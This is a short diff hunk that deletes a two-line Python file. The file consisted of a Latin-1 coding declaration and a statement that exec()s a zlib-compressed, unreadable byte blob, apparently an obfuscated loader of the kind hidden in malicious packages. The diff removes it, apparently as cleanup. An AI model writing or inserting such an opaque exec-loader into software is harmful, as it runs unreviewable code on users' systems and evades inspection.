@@ -1,2 +1,0 @@
-#coding:L1
-import zlib;exec(zlib.decompress(bytes('S×r#!|F_ÂXãü¶+J¾œÃÖÚV@UkûJZUùüõ7åË/ÀPMwCc;a/¸DYƒi4Båmìˆë¸SqVBƒUæ¦5?k	Ýj³3ZšV²¹­—s×`qf²Pt¢¤ñ¼,žÿçGíºØ;àÎx¨5ƒ„ÉtÎ$«ˆˆT©àä¨|Çƒ7BÊíVwe¢Óêe¦h—E§jm£^Î,ã6©o‰È$‘y®èFˆ³,œÌ§OÖ-lÍã­«EåõÀ,wö±æUmçtèzèáð¤ÆJ÷Ø¼MíÅ•(ÛÜ5,UX–»¢2©Ø‡…-.Äyâý6xä^WÞÛïBŒ¦KWÇ«~ðä1dáõñ#àù*þvÃÑ¿§‡Ü`¼µI‡úÂ§“‚ÊtaJ\nHôþ”ŽŽŽ¾#ý«|dƒ)4Bÿw8DÎuSa»iÀK‡:Ý!dux€ÐšÐ¬Ð;ý[{­òœÇçÆ/ÜoGP{ÀëÜ7|ðý±óPß3þ­røTÍø‘ï]HÐÏ¿¦Þ±kÝò›êôÚ>³ÝmB‘Q!TäýÊ×¬ÍóÝ—~ÄÊÕ¾iI=Ò<ÇÇâœ¦xôŠpÙ~<ƒpˆšb{sè7×BƒãaƒÙ‡ýs1Çƒ“»ñÈÈñç´¢ÁsýÙÃ!S¢I;ü‰<ÜsÆûõÅ& °Â>@.ÅgÞÇÈUX\ú_Ôæ(!7âåœwh¢ª+®(Šä=ñ•w!&>^cÒÏ.Žˆ9|>|å','L1'),-9))
